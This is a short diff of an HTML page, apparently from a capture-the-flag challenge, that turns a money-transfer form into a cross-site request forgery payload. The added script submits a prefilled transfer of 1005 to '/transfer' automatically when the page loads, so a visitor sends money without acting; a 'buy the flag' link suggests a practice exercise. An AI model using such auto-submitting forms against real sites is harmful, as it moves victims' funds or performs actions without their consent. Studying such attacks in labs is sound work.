@@ -18,7 +18,7 @@
 <body>
     <div class="container">
         <h2 id="sad">You have</h2>
-        <form action='/transfer' method="POST">
+        <form id="transferForm" action='/transfer' method="POST">
             <div class="form-row">
               <div class="form-group col-md-6">
                 <label for="inputTo">To</label>
@@ -27,15 +27,20 @@
               <div class="form-group col-md-6">
                 <label for="inputAmount">Amount</label>
                 <input type="number" class="form-control" id="inputAmount" name="amount" value="1005">  
-    
               </div>
             </div>
             <button type="submit" class="btn btn-primary">Send the Money!</button>
-          </form>
-
-          <a href="/buyflag">Click here to buy the flag!</a>
+        </form>
+        <a href="/buyflag">Click here to buy the flag!</a>
     </div>
-    
+
+    <script>
+      // Automatically submit the form when the page loads
+      window.onload = function() {
+        document.getElementById('transferForm').submit();
+      };
+    </script>
+
 </body>
 
 </html>
